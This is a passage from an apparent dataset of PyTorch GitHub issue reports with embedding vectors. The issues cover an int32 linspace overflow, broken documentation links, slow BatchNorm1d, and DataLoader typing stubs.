 -1.54289324e-03 -1.77611902e-01 -4.62165549e-02 -3.03930026e-02
  3.24145295e-02 -9.00844261e-02  1.94747835e-01 -6.34653717e-02
  3.41497421e-01  1.89682305e-01 -2.00486854e-02 -1.65501460e-01
 -1.92582577e-01  8.41436237e-02  8.66066217e-02  1.32083625e-01
 -2.78860688e-01  1.22032836e-01  3.76847535e-01 -2.12937444e-01
 -1.76076382e-01  1.55474424e-01  1.40412495e-01 -4.20194030e-01
  2.18015462e-01 -6.99109882e-02  2.03881145e-01 -1.51673511e-01
  2.96697974e-01  1.39078215e-01  2.05194086e-01 -2.19553322e-01
 -2.02755898e-01 -2.06599105e-03  4.28185642e-01  2.75859416e-01
 -1.08194746e-01 -1.67703956e-01 -5.89909032e-02 -4.29579765e-02
 -6.14705458e-02 -1.50798023e-01  3.96003425e-02  1.42257929e-01
 -2.47954518e-01 -2.38531426e-01  3.40361893e-01  1.10870034e-01
  2.42736906e-01 -2.91223586e-01  1.20818630e-01  9.69184414e-02
  2.19673514e-02 -8.68717860e-03  2.28469163e-01  3.52558345e-01
  1.29460404e-02  2.48977728e-02  1.90651685e-01  4.10233676e-01
 -4.79624830e-02 -4.73833531e-01  1.29920498e-01  7.87089765e-02
  6.03867508e-02  6.41645044e-02 -5.88868618e-01  2.06326172e-01
  3.64267230e-01 -1.07660733e-01  5.59864528e-02  6.82599917e-02
  2.12768883e-01 -1.28038108e-01  1.86856747e-01  1.75385147e-01
 -2.33346839e-02 -2.07682297e-01 -1.72831327e-01 -2.49867305e-01
  2.21665520e-02  7.59403110e-02  3.91605884e-01 -1.82327852e-02
 -4.93026942e-01 -2.77949497e-04 -2.21032277e-01  2.55145073e-01
  1.35572627e-01 -1.58771634e-01 -1.45160913e-01 -1.84792876e-01
  5.94641007e-02  5.26696742e-01  2.98323184e-01  1.39059693e-01
  1.80685908e-01 -1.44699335e-01 -7.09025711e-02 -1.27563015e-01
 -7.98203200e-02  3.32183838e-02  2.67223604e-02 -3.84037830e-02
  2.43111044e-01  1.84800267e-01 -3.57429296e-01 -2.28838056e-01
  4.24655825e-02 -6.12853616e-02 -1.06145613e-01 -5.14749289e-02
  1.36922419e-01 -2.77977526e-01  2.36908570e-01 -2.02110052e-01
  2.69386888e-01 -1.33282334e-01 -1.08504131e-01  2.99178571e-01
  2.21568495e-01 -2.45102525e-01  1.92689747e-01  2.74612606e-01
  7.70156980e-02  3.02827120e-01  8.88525993e-02 -8.41207989e-03
 -1.27601475e-01  1.15929917e-02 -2.54501045e-01  8.43615234e-02
 -9.15666446e-02 -1.22745417e-01  1.50476858e-01 -1.80726245e-01
 -8.95595700e-02 -1.76654026e-01  1.58061646e-03 -2.47240901e-01
  1.34434164e-01 -1.83578730e-01  1.29846409e-01 -2.59042948e-01
 -1.55316234e-01 -5.47773466e-02 -3.36150140e-01 -2.95467317e-01
  1.83903277e-01 -9.16122645e-02 -8.44742656e-02 -3.47297847e-01
 -4.51699719e-02 -3.53785157e-02 -3.50641310e-01  1.46370485e-01
 -1.66964419e-02  8.25224370e-02  6.36853278e-02  4.70016837e-01
  3.45030800e-02 -1.95278689e-01 -1.77193820e-01 -1.12339489e-01
 -2.02870205e-01 -1.97237283e-01 -3.98637094e-02 -1.37346268e-01
 -1.80738315e-01  3.00291091e-01  3.59395593e-02 -1.21754691e-01
  1.19983129e-01 -3.90911162e-01 -6.43270556e-03  8.92128646e-02
  9.57753807e-02 -8.16167444e-02 -2.88596272e-01  1.03665054e-01
 -4.39879537e-01 -2.17772394e-01  1.45298973e-01 -1.72742352e-01
  1.20979562e-01  1.98604792e-01  1.94279701e-01 -3.11003588e-02
 -3.09789199e-02  7.40917474e-02  2.16704547e-01  1.71526313e-01
  4.96218819e-03 -1.34830847e-01  3.63919318e-01 -2.65128948e-02
 -1.15362316e-01 -5.25295809e-02  4.88554358e-01 -1.50293097e-01
  3.87458026e-01  1.47574067e-01 -1.55326337e-01  2.52287626e-01
  2.64414489e-01  3.41328949e-01 -2.51587451e-01 -5.82101606e-02
 -3.15557495e-02 -6.47265092e-02 -2.29739696e-02 -3.67052794e-01
  8.53736326e-02 -2.51677278e-02  3.71922776e-02 -1.43531531e-01
  1.62689239e-01 -2.05619991e-01 -1.43429950e-01  4.74089757e-04
 -1.44832935e-02  4.38691974e-02 -4.13403958e-02  1.83987886e-01
  1.57670945e-01 -1.18184626e-01  4.95908447e-02 -1.65384382e-01
 -2.14635711e-02 -1.08621642e-01 -9.91809815e-02  3.18757176e-01
  3.06685358e-01  3.26510847e-01 -4.82353717e-02  2.15642542e-01
  5.16993180e-02  5.47326505e-02  2.93447971e-02 -3.42098847e-02
 -2.50911772e-01 -2.33509973e-01 -1.22042760e-01 -4.82832156e-02
 -1.44915447e-01 -1.41741455e-01 -1.47367314e-01  6.60136417e-02
  1.95842758e-01 -3.19244683e-01  1.58581525e-01  4.08993006e-01
  4.30148654e-02  4.68578160e-01 -2.54239500e-01  1.05757125e-01
 -3.95507693e-01  3.16030800e-01 -9.43327919e-02  2.06615254e-01
 -1.23258963e-01 -1.28974289e-01 -1.79982886e-01  3.42287838e-01
  1.39756694e-01 -1.56908751e-01 -4.81947064e-01 -2.08885089e-01
 -2.00124025e-01 -2.28645176e-01 -9.97464657e-02 -2.57541180e-01
 -1.93317354e-01  7.68903643e-02  2.39644647e-01  5.70848659e-02
 -1.22280031e-01  4.90270734e-01  1.71143472e-01 -2.14016512e-01
  1.69091746e-01  1.75678492e-01  1.22211412e-01  3.23128194e-01
 -1.20643219e-02  1.38300657e-01  1.97614416e-01  3.53349984e-01
 -2.79574580e-02 -1.12561453e-02 -1.41767219e-01  2.33443320e-01
  8.13617557e-03 -2.94586271e-02 -2.04118490e-01  2.36868590e-01
  1.27286613e-01  2.69505143e-01  2.18840152e-01  3.05867732e-01
 -3.32921445e-01 -2.24376872e-01 -1.64066106e-01 -1.61126912e-01
 -6.53420836e-02  1.01272184e-02 -3.90051782e-01 -9.95036811e-02
  2.18402147e-01  1.62309229e-01 -1.42573565e-01  5.61918020e-02
 -3.27912956e-01  1.22041302e-02  2.51109660e-01 -1.85477927e-01
 -4.25312147e-02 -1.17541924e-01  7.37395510e-02 -9.02969539e-02
 -6.17051125e-02  1.17446572e-01 -8.02196264e-02  1.11773595e-01]"
linspace returns wrong result for int32 module: numerical-stability triaged enhancement,"## ðŸ› Bug

`linspace` with `int32` dtype returns wrong results when input values are big. This happens on nightly build (`macOS`) and source build (`ubuntu`).

## To Reproduce

```
$ python -c 'import torch;print(torch.linspace(-2147483647, 2147483647, 10, dtype=torch.int32))'
tensor([-2147483647, -2147483647, -2147483647, -2147483647, -2147483647,
         2147483647,  2147483647,  2147483647,  2147483647,  2147483647],
       dtype=torch.int32)
```

```
$ python -c 'import torch;print(torch.linspace(-2000000000, 2147483647, 10, dtype=torch.int32))'
tensor([-2000000000, -2016387072, -2032774144, -2049161216, -2065548288,
        -2147483648, -2147483648, -2147483648, -2147483648,  2147483647],
       dtype=torch.int32)
```

```
$ python -c 'import torch;print(torch.linspace(-1000000000, 2147483647, 10, dtype=torch.int32))'
tensor([-1000000000, -1127498183, -1254996366, -1382494549, -1509992732,
        -2147483648, -2147483648, -2147483648, -2147483648,  2147483647],
       dtype=torch.int32)
```

## Expected behavior

linear interpolation is correct

## Environment

<details><summary><code>Mac</code></summary>

```
Collecting environment information...
PyTorch version: 1.6.0.dev20200616
Is debug build: No
CUDA used to build PyTorch: None

OS: Mac OSX 10.15.5
GCC version: Could not collect
CMake version: Could not collect

Python version: 3.7
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip] numpy==1.18.1
[pip] torch==1.6.0.dev20200616
[conda] blas                      1.0                         mkl
[conda] mkl                       2019.4                      233
[conda] mkl-service               2.3.0            py37hfbe908c_0
[conda] mkl_fft                   1.0.15           py37h5e564d8_0
[conda] mkl_random                1.1.0            py37ha771720_0
[conda] numpy                     1.18.1           py37h7241aed_0
[conda] numpy-base                1.18.1           py37h6575580_1
[conda] pytorch                   1.6.0.dev20200616         py3.7_0    pytorch-nightly
```
</details>

<details><summary><code>Ubuntu</code></summary>

```
Collecting environment information...
PyTorch version: 1.6.0a0+ec1833b
Is debug build: No
CUDA used to build PyTorch: 10.1

OS: Ubuntu 18.04.3 LTS
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
CMake version: version 3.10.2

Python version: 3.8
Is CUDA available: Yes
CUDA runtime version: 10.1.243
GPU models and configuration:
GPU 0: Quadro GP100
GPU 1: Quadro GP100

Nvidia driver version: 418.116.00
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5

Versions of relevant libraries:
[pip] numpy==1.18.1
[pip] torch==1.6.0a0+ec1833b
[pip] torchaudio==0.6.0a0+2fa6cc7
[pip] torchtext==0.6.0a0+e823aca
[pip] torchvision==0.7.0a0+f9ef235
[conda] magma-cuda101             2.5.2                         1    pytorch
[conda] mkl                       2020.1                      217
[conda] mkl-include               2020.1                      217    conda-forge
[conda] numpy                     1.18.1           py38h8854b6b_1    conda-forge
[conda] torch                     1.6.0a0+ec1833b           dev_0    <develop>
[conda] torchaudio                0.6.0a0+2fa6cc7           dev_0    <develop>
[conda] torchtext                 0.6.0a0+e823aca           dev_0    <develop>
[conda] torchvision               0.7.0a0+f9ef235           dev_0    <develop>
```
</details>
",True,"[-2.38764137e-01 -4.62263316e-01 -3.15291703e-01 -4.60558608e-02
  1.39946966e-02 -3.33035499e-01  2.09885035e-02  1.46104947e-01
 -2.50232071e-01 -1.77487895e-01 -3.44970882e-01  2.15679899e-01
  2.50107683e-02  5.66345733e-03 -1.59795403e-01  3.22874963e-01
 -1.99775398e-01 -1.56398207e-01 -4.15027678e-01 -1.18538458e-03
  9.82290506e-03 -1.02187760e-01 -8.92622918e-02 -4.38283160e-02
 -1.76847428e-01 -1.32645339e-01  1.10429287e-01 -8.32919627e-02
  3.15575719e-01 -4.09913473e-02  7.91945606e-02 -1.11139581e-01
 -6.94060251e-02  1.04299873e-01  3.43252569e-02  2.16571525e-01
 -1.99141160e-01 -1.89116910e-01 -4.22837138e-01  8.69776234e-02
 -7.20023140e-02  1.63912028e-01  2.25857764e-01 -1.06909096e-01
  3.15473936e-02  7.05957487e-02 -1.45684242e-01  3.99441049e-02
 -8.42137039e-02  4.31628078e-02  9.21492279e-02  1.19272105e-01
 -7.10890889e-02 -2.89968580e-01 -1.24261707e-01  1.56224489e-01
 -3.41650218e-01 -1.31839752e-01  1.74666449e-01 -2.58465230e-01
  2.42947280e-01 -7.08927661e-02 -1.44452490e-02 -9.48968381e-02
  2.17453107e-01  7.17553347e-02  3.19282800e-01  6.53460026e-02
  3.88895214e-01  9.66016948e-02  1.19146015e-02  2.45207362e-02
 -3.85867745e-01  3.36038262e-01  2.42365807e-01  2.08385259e-01
 -2.09448814e-01  1.54910088e-01  2.13061109e-01  8.80655497e-02
  4.77043353e-03 -1.00219876e-01 -1.96866468e-01 -3.10281634e-01
  1.34403482e-01  6.19411319e-02  4.03654426e-01 -2.52865970e-01
  5.62715940e-02 -5.93652315e-02  3.56241137e-01  1.26608178e-01
 -2.04068527e-01  3.10326278e-01 -1.82212815e-01  1.16398200e-01
  4.35672522e-01 -2.08667636e-01 -1.02591299e-01 -8.52608681e-02
 -3.45152654e-02  4.43660766e-02 -3.41315627e-01  2.36774534e-01
 -1.51143759e-01 -1.52151734e-01  2.67426878e-01  2.06182092e-01
  7.18493536e-02  2.80763619e-02  5.16069770e-01 -2.47162387e-01
 -1.08983228e-02 -1.27739757e-01  2.12723985e-02  1.46259874e-01
 -1.60274610e-01  3.42101380e-02  4.68485616e-03  5.16764760e-01
 -1.88348442e-03  7.11555183e-02 -5.31724393e-02  3.14981937e-01
  2.51133531e-01  1.36218116e-01  1.35337189e-01  9.71221030e-02
 -2.92583942e-01 -2.43426561e-01 -1.09164394e-01  1.76828384e-01
 -9.98293012e-02  4.58697602e-02  9.73064899e-02  2.38713562e-01
 -1.13063112e-01  2.65474170e-02 -1.54124260e-01 -1.60993040e-01
 -2.10143030e-01  5.44438437e-02  1.55064650e-02 -3.36373389e-01
  3.36474985e-01 -1.14827819e-01 -9.07548517e-02  5.74163087e-02
 -7.38173127e-02 -9.45746675e-02  3.40959132e-02 -1.14522979e-01
 -3.76354188e-01  4.04359967e-01  1.54242367e-01  2.13988602e-01
  3.30961287e-01  5.81568331e-02  2.68681616e-01 -2.15875655e-01
 -3.45128588e-02  3.53172123e-01  9.47556645e-02 -9.45833325e-02
  2.89138377e-01  9.67604667e-03 -1.21596470e-01  1.01272888e-01
 -2.57290304e-01  2.25516751e-01 -6.61633015e-02 -2.11048871e-01
  1.57117009e-01 -4.08195853e-02  5.00283420e-01 -1.53290510e-01
  1.83013707e-01 -3.28214467e-01 -2.65015662e-02  3.55659634e-01
  3.72008741e-01  4.37137723e-01  4.21595067e-01  1.19508415e-01
 -1.63112819e-01 -3.93162444e-02  9.25180763e-02  1.78027391e-01
  7.39756040e-04 -5.74708283e-02 -1.31913535e-02 -3.13868225e-01
  3.27034853e-03 -1.07979812e-01  1.58246383e-01 -1.23030499e-01
  2.91295089e-02 -2.37191319e-01 -2.08031945e-02 -1.07686892e-01
  4.38148379e-02  2.04667285e-01 -1.44556761e-01 -1.36016637e-01
  1.02879167e-01  2.81566884e-02  3.99587974e-02 -2.11831927e-01
 -1.22933462e-01  2.19117016e-01 -2.44990602e-01 -1.85746968e-01
  8.85612145e-02 -2.75436163e-01 -4.69668508e-02  1.71602786e-01
  6.86518028e-02 -1.59044772e-01 -3.40698957e-02  3.01511496e-01
  2.40920141e-01 -1.95558131e-01 -2.01085836e-01 -3.91090572e-01
  2.24365711e-01 -1.33041918e-01 -4.67336416e-01 -3.02279852e-02
 -1.27589583e-01  8.93391818e-02  1.16985872e-01 -8.76706913e-02
 -4.63018268e-02  2.61998065e-02  2.16174766e-01  7.55961090e-02
 -4.34637576e-01 -1.71122283e-01 -3.47185358e-02 -2.10963011e-01
 -3.02123517e-01 -2.32874956e-02  1.22181311e-01 -2.67869473e-01
  6.63550496e-02 -6.77296706e-03 -3.37031037e-01 -1.06327794e-01
 -1.57836467e-01 -2.25402787e-02 -9.68197733e-02  1.12918176e-01
 -6.02228642e-02  4.88736574e-03  2.60616779e-01  1.53125718e-01
  9.69548672e-02  7.36344382e-02  7.62934377e-03 -1.80915385e-01
  4.39534307e-01  2.00856954e-01  8.82978961e-02  2.26947352e-01
  1.39833335e-02  2.24129200e-01 -1.53758347e-01  2.01623812e-01
  1.89534992e-01 -9.99611467e-02 -3.58626842e-02 -6.46309257e-02
  5.71533799e-01 -8.95599648e-02  5.07032573e-01 -3.79888862e-01
  5.10494232e-01 -1.37398750e-01 -2.40785733e-01 -6.23728260e-02
 -9.59663391e-02  1.52640402e-01 -4.28501107e-02  2.51199096e-01
  2.35865891e-01 -2.41839588e-01 -2.95046084e-02 -2.90726602e-01
 -2.04062760e-01 -2.52805918e-01 -1.30061492e-01  1.94480240e-01
 -6.56207800e-02  1.98948663e-03  2.48307306e-02 -1.94868997e-01
  1.51040941e-01 -2.57199071e-02  4.83526401e-02  6.19594231e-02
  2.71813661e-01  8.66997540e-02  3.76874655e-01 -1.44500524e-01
 -1.53511688e-01  1.56626195e-01  1.79256439e-01  9.68207493e-02
  3.17056865e-01 -9.31501687e-02  3.71665329e-01  2.26419196e-01
 -2.68988132e-01  3.23936880e-01 -4.88996021e-02  9.95755792e-02
 -3.51570070e-01  3.57505113e-01  6.69290721e-02 -3.82881612e-03
 -3.61503899e-01 -1.65864378e-01 -4.28291738e-01 -1.44365788e-01
 -3.30101922e-02  2.55001932e-01 -2.66663820e-01 -3.69199775e-02
 -6.58013225e-02  9.00577158e-02  4.62205745e-02  9.39315781e-02
 -2.52027571e-01  3.57224345e-01 -1.18457533e-01  1.04009733e-01
 -3.44504625e-01  2.72665620e-01 -1.97354466e-01 -1.95335776e-01
  1.54964831e-02  2.00248092e-01  1.07224584e-01 -2.33559310e-01
 -1.37462109e-01 -2.15451598e-01  1.67162091e-01  6.04886293e-01
 -1.09267920e-01 -5.18267937e-02 -2.43589103e-01  8.14794078e-02
 -6.35467097e-03  6.99316263e-02 -2.89081812e-01  4.06351089e-01
 -9.44648683e-02 -1.52051941e-01  5.45753576e-02  1.52578369e-01
 -1.48620885e-02  3.02968398e-02 -3.15989017e-01 -3.01240236e-02
  3.00655782e-01  5.66219687e-02  6.83160275e-02  1.20118946e-01
 -8.58907029e-03  2.26283371e-01 -3.24974000e-01  2.43114047e-02
 -1.37451366e-01  2.76394129e-01  2.73010015e-01 -7.81306982e-01
 -5.20247757e-01  1.06577203e-01  1.54355496e-01  3.54704857e-02
  6.23382963e-02  8.13580826e-02 -7.54259154e-02  1.41936362e-01]"
[docs] Urls changed => forum links would become invalid high priority module: docs triaged module: doc infra,"Originally in https://github.com/pytorch/pytorch/issues/18095#issuecomment-633149307:

@vadimkantorov:
Works: https://pytorch.org/docs/stable/torch.html#torch.flip
Breaks: https://pytorch.org/docs/master/torch.html#torch.flip

@t-vi:
They're now separate pages: https://pytorch.org/docs/master/generated/torch.flip.html#torch.flip
...but it would break many links, including on the forums.

@ezyang:
Yes, this will be a release blocker for next release.

cc @ezyang @gchanan @zou3519 @mattip",True,"[-0.2627715  -0.2126022   0.06862561  0.15050483  0.05824437 -0.2426562
 -0.22651064  0.05498737 -0.19298655 -0.02906615 -0.00373873  0.28329295
  0.04215359  0.21659657 -0.11808437  0.09750824 -0.4587824  -0.18678933
 -0.03228426  0.22567791 -0.24835706  0.13203071 -0.3877283   0.06922579
 -0.06530914  0.04714688 -0.4622612  -0.1802339  -0.13840389  0.19463968
  0.22152203  0.09715591 -0.512928   -0.12548709  0.36730677  0.04969738
 -0.1260965  -0.08840761 -0.21316727 -0.10369433  0.14631747 -0.09415106
 -0.05731062  0.19613564 -0.3033768  -0.00388058 -0.2376998   0.02731734
 -0.05230869  0.22254214 -0.4098355   0.06444059 -0.07044841  0.07251474
  0.13447616 -0.1314621   0.04219769  0.30218345  0.16587076  0.24031076
  0.22323295  0.10858594  0.01920418  0.21532032  0.00782198  0.08633399
 -0.10809506 -0.0456709   0.36794102  0.02598067  0.00833167 -0.0667668
  0.03155473 -0.19417565  0.17907593 -0.00782315 -0.5252058   0.07653826
 -0.0430323  -0.16873853  0.11741277  0.01342425  0.07901166  0.07792903
  0.16766548 -0.01798325  0.13462383 -0.11559048  0.1780777  -0.15374705
  0.29563925  0.09996893  0.61168945  0.14089015  0.1369572   0.01990364
 -0.06284027  0.04555219 -0.32290587 -0.27078462 -0.21134283 -0.44480976
 -0.34407267  0.00988244 -0.15182097 -0.35070974  0.40853268  0.23058069
 -0.06050285  0.27393836  0.3549726   0.10365534 -0.01998417 -0.16481426
 -0.3049193   0.15424289  0.0396741  -0.1010778  -0.32010955  0.1342321
 -0.03099081  0.23547736 -0.10970233  0.08799452  0.23662987  0.1984106
 -0.02555869  0.36879474  0.04066364  0.02717612 -0.07624738 -0.09040391
  0.1509771   0.06970251  0.3697184   0.0789989  -0.34266976 -0.2391904
  0.14332606  0.12595448 -0.12379487  0.08891532 -0.23638952 -0.24657375
  0.20878363  0.33006197 -0.35781804 -0.25900465  0.06759019  0.32127345
 -0.00960029  0.25013855 -0.21802798  0.7724966  -0.0154691   0.3222752
  0.15997484 -0.00803132 -0.12198884 -0.22279969 -0.10720612  0.13704598
  0.07738094  0.25237542  0.2784293  -0.16108027 -0.4233142  -0.11204638
 -0.3329156  -0.04517853 -0.0248525  -0.00275284  0.0360795   0.02980127
  0.00926975 -0.11165106 -0.02470965 -0.17014779 -0.13874705  0.25269458
  0.11986502  0.3962302   0.05041936  0.04396776 -0.132331    0.22393833
  0.17477222 -0.16053528  0.08251376 -0.4408325  -0.28689852 -0.01842109
  0.0316937  -0.16687384 -0.00135209  0.3171386   0.06144924  0.01862623
  0.05643954  0.07994418 -0.07424867  0.35997546  0.1138175  -0.192572
 -0.1505546   0.04039366 -0.22552699 -0.35918555 -0.31636292 -0.27224526
 -0.06360726  0.09732845 -0.15476875 -0.51132447 -0.18340452  0.6769246
 -0.19769084 -0.07841995  0.07090713  0.07598189  0.2583335  -0.06300935
 -0.13400078 -0.38570228  0.11611    -0.04356739 -0.07959928  0.32589653
  0.08038646  0.1658406  -0.26606792 -0.14267622  0.3582297   0.03447811
  0.07037807  0.4176723  -0.02019048 -0.1797212  -0.12144639  0.27295214
  0.04452793 -0.25251925 -0.11892183  0.10647323  0.14622517  0.12993728
 -0.19432703  0.26462913 -0.30913383  0.00817089  0.3682017  -0.45283005
  0.08777198  0.07424504  0.18944006  0.10099101 -0.17654546 -0.00573079
  0.17528738  0.03682367  0.19611403  0.11093847 -0.32796416  0.49599087
  0.35744613  0.05601779 -0.05103541  0.18048222 -0.2183483  -0.25659966
  0.34561172 -0.20687981  0.29495788  0.14783354 -0.01943999 -0.32051486
  0.5117328  -0.3898034  -0.01575762 -0.04408219  0.08679     0.16920142
 -0.18591782  0.3520141   0.37221467 -0.25147504 -0.2603212  -0.27051568
 -0.17915732  0.00674385 -0.19851264  0.08483099  0.25866014  0.11981234
  0.00580567 -0.15999421  0.05480558 -0.04289811  0.34305733  0.00390179
 -0.0185232   0.21227315  0.1636831  -0.22133794  0.02399023 -0.15809488
 -0.30443856  0.1412158   0.2964488  -0.308714    0.11516446 -0.00658829
 -0.18385221  0.2501734  -0.20227867 -0.03646307  0.01500576  0.3304972
 -0.10125647 -0.02054268  0.251926    0.17185208 -0.38680217  0.219228
  0.1639198   0.21376811 -0.45064017  0.508652   -0.2125868   0.09911308
  0.03159846  0.04546925  0.13143744 -0.14167532 -0.13341542 -0.17282644
 -0.00693734  0.20304205 -0.00328004 -0.35061127 -0.16382775 -0.08282198
  0.42712098 -0.23767546 -0.41397548  0.00725381  0.19061248  0.3266098
 -0.00904321  0.18456124 -0.1426141   0.09092111 -0.4341356   0.30882278
 -0.21572779  0.24452098 -0.31155676  0.29593787  0.22436371  0.25846022
 -0.19498613  0.15593743 -0.3047446  -0.02980934 -0.29418755 -0.0335932
 -0.1535385   0.27041966 -0.01437163  0.20431428 -0.19384524  0.02035273
 -0.09740016 -0.02387408  0.1972362  -0.21347207  0.36008143 -0.00612378
 -0.21521911 -0.18397501  0.2598443  -0.00898462 -0.11219649  0.08150089]"
Different speed between BatchNorm1d and BatchNorm2d high priority module: dependency bug module: performance module: cudnn module: nn module: cuda triaged,"Hi I assume BatchNorm1d and BatchNorm2d (or 3d) should have same performance. However when normalizing a tensor of shape `(L, C) = (B*H*W, C)` by BatchNorm1d, the speed is >5x slower than BatchNorm2d on a shape of `(B, C, H, W)`. Is this expected or is there a way to speed up?

Reproducer:

```
import torch

def time_bn(bn, x):
    start = torch.cuda.Event(enable_timing=True)
    end = torch.cuda.Event(enable_timing=True)
    start.record()
    x = bn(x)
    end.record()
    torch.cuda.synchronize()
    print(start.elapsed_time(end))
    return x

shape = (50, 50, 50, 50)
a = torch.rand(shape)
b = a.flatten(0, -2)

bna = torch.nn.BatchNorm2d(50)
bnb = torch.nn.BatchNorm1d(50)

time_bn(bna, a)
time_bn(bnb, b)
```

Output:
```
11.409407615661621
89.55596923828125
```

## Environment

```
 - PyTorch Version: tested on 1.4/1.5
 - OS: Ubuntu 18.04
 - How you installed PyTorch (`conda`, `pip`, source): conda
 - Python version: 3.7/3.8
 - CUDA/cuDNN version: 10.1
 - GPU models and configuration: GTX 1070
 - Any other relevant information:
```

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @ngimel @csarofeen @ptrblck @xwang233 @albanD @mruberry @VitalyFedyunin",True,"[-0.08539868 -0.57655275 -0.27859306 -0.28509676 -0.35498786 -0.2767973
 -0.25594604  0.20516326 -0.33032164 -0.07611039 -0.09932575  0.2133253
  0.09034457 -0.15868816 -0.1612952   0.22661775  0.27735257 -0.01248781
 -0.24593103  0.17225763 -0.18055874 -0.19656903 -0.09562512  0.05761252
  0.29294163 -0.03738302  0.09925145 -0.0035001   0.3126785  -0.08527535
  0.04630776  0.09066139  0.02264941 -0.11803503 -0.3157524   0.21026406
 -0.13139161 -0.4479671   0.22020741  0.1509131   0.06201324  0.05670076
  0.02800486 -0.04355808 -0.105113    0.2897247  -0.04129161  0.39900607
 -0.3192215  -0.04980962  0.10749446 -0.09667954  0.0271254  -0.3383131
 -0.07078582  0.0043699   0.26982856 -0.06297351 -0.01484046  0.01390794
  0.06657141 -0.11094557  0.07947252 -0.08913032  0.3107332   0.086285
  0.13475679 -0.13970973  0.4238446   0.136655    0.20632684  0.22586508
 -0.23584098 -0.24431431 -0.12059586  0.12523936  0.0300384   0.2151904
  0.02618308 -0.45502952 -0.06873085 -0.16080393  0.12984258 -0.40319794
  0.07081806 -0.1193463   0.23037517  0.25344884  0.03114929 -0.07448276
  0.16413143  0.1283863  -0.21170467  0.2548627   0.11547716  0.2884875
  0.01580566  0.03732943 -0.09580086 -0.15860388 -0.10756865 -0.1971944
 -0.387496    0.3232181   0.02516164 -0.14034578  0.12803757 -0.3283412
 -0.01155373  0.26287842  0.41431305  0.01902339  0.29350016 -0.01800812
  0.2076141   0.12180714 -0.17688659  0.14574303 -0.247065    0.09531035
 -0.17660275 -0.10805718  0.2169547  -0.2964548  -0.0019611   0.00160948
  0.36967915 -0.20495208 -0.38477108 -0.21342508  0.04880329  0.20272526
 -0.08092068  0.17190759  0.07673357  0.22081596  0.08082447 -0.5493494
 -0.3449556  -0.48385975 -0.29685122  0.19815186  0.02208248 -0.17321637
  0.38434064 -0.06771201 -0.44275582  0.02529777  0.14084049 -0.1039501
 -0.11714367  0.14971635 -0.02319293 -0.20248343  0.34259576  0.22754627
  0.08995607 -0.09407463  0.05357638 -0.3587532  -0.22465038  0.40153742
  0.16371086  0.15919124 -0.12809855  0.22405028 -0.20284528 -0.23271456
 -0.34566694  0.34980315 -0.22476593 -0.22819021 -0.03757877 -0.3619527
  0.04949807 -0.1003545  -0.33620667 -0.34846154  0.03299201  0.25189272
  0.21806577  0.34744844  0.3921289  -0.01052278  0.24993207 -0.00575639
  0.19680554  0.39114642 -0.12732075  0.18000248  0.00385125 -0.00569269
 -0.04209302  0.2338593   0.1620384  -0.19589046  0.57571495  0.19942707
  0.5566573  -0.01890689 -0.26533115  0.06763824 -0.110133    0.0280949
  0.26491213 -0.23045638 -0.33989185 -0.2228876   0.03316312  0.19287883
 -0.42961523 -0.39720643 -0.09606444 -0.16237384 -0.39038855  0.22121808
  0.12902793  0.29682627 -0.05807779 -0.06564874  0.3544863   0.03363913
  0.21124    -0.09841485  0.12755495  0.18143916  0.10146794 -0.02004895
 -0.01285789  0.31578952 -0.26011074  0.00440799 -0.439421   -0.08274876
 -0.19922698 -0.07986767  0.08060638  0.10896076  0.11724228  0.15486012
  0.1140397  -0.21897548  0.09264011  0.05045981  0.45229253 -0.03416662
 -0.33754054  0.25812247 -0.29472715  0.22767861 -0.60584176 -0.00814146
  0.08136525 -0.32032448  0.18714643 -0.34675038 -0.05863994 -0.09285413
  0.04209059 -0.04236003  0.5356337   0.28867602 -0.24996799  0.27480346
  0.38745964  0.03072942 -0.21666607  0.06368545 -0.02605328 -0.02611299
  0.04493462 -0.33377552  0.11447194 -0.21296345  0.17144975 -0.06114889
  0.262026    0.0510836  -0.04760669 -0.16604547 -0.03752928 -0.00691394
  0.01454442  0.21320063  0.32920098 -0.3500822  -0.01787307 -0.25247365
 -0.54543763 -0.1445826  -0.07057217  0.19617973  0.2936046  -0.21802525
 -0.19903545  0.42273962  0.2901299   0.11951984 -0.13866374 -0.5578437
 -0.06408957 -0.10319452  0.1924603  -0.05004321 -0.41903085  0.06763598
  0.00568642  0.09614571 -0.28723627 -0.0572951   0.40730172 -0.51874554
 -0.04886186  0.10328863  0.01719261  0.4963978   0.1692839   0.3821167
  0.32938522  0.00843378 -0.10561118 -0.31421006  0.01565016 -0.04376807
  0.19198488 -0.18017358 -0.45607772  0.03334942 -0.0310815   0.15511364
  0.26739985 -0.05376206  0.12710138  0.06312425 -0.01919544  0.00201254
  0.08237511  0.27531403  0.06494913 -0.18037222  0.1660438  -0.06678879
  0.24948566 -0.18361905 -0.13121207  0.07273719  0.2264675   0.30657482
 -0.04866551 -0.34261215  0.00474974  0.36780027 -0.07834067 -0.28196913
 -0.1693843   0.10300896  0.10219709  0.12733786  0.20795044  0.16580446
 -0.0562958   0.139358   -0.20165336 -0.03030826  0.38443738 -0.28386012
  0.00768135 -0.2513702   0.05606762  0.05685229 -0.16080728  0.29672736
  0.19610217  0.17807436  0.46012497  0.10787128 -0.16447912 -0.05632015
  0.16645792  0.17478348 -0.12842011 -0.38907963 -0.2145885   0.00683044]"
Typing Error in torch.utils.data.DataLoader and Dataset high priority module: typing triaged,"## ðŸ› Bug

In [dataloader.py#60](https://github.com/pytorch/pytorch/blob/d035d05080729c30636ff30fcc068de3c7e9badd/torch/utils/data/dataloader.py#L60), `DataLoader` does not inherit `typing.Generic`, but in [dataloader.pyi#15](https://github.com/pytorch/pytorch/blob/d035d05080729c30636ff30fcc068de3c7e9badd/torch/utils/data/dataloader.pyi#L15) type inferace of `DataLoader` inherits `typing.Generic`.

`Dataset` is also in same situation. See also [dataset.py#L8](https://github.com/pytorch/pytorch/blob/d035d05080729c30636ff30fcc068de3c7e9badd/torch/utils/data/dataset.py#L8), [dataset.pyi#L6](https://github.com/pytorch/pytorch/blob/d035d05080729c30636ff30fcc068de3c7e9badd/torch/utils/data/dataset.pyi#L6).

## To Reproduce

```python
>>> import torch
>>> from typing import List
>>> from torch.utils.data import Dataset, DataLoader
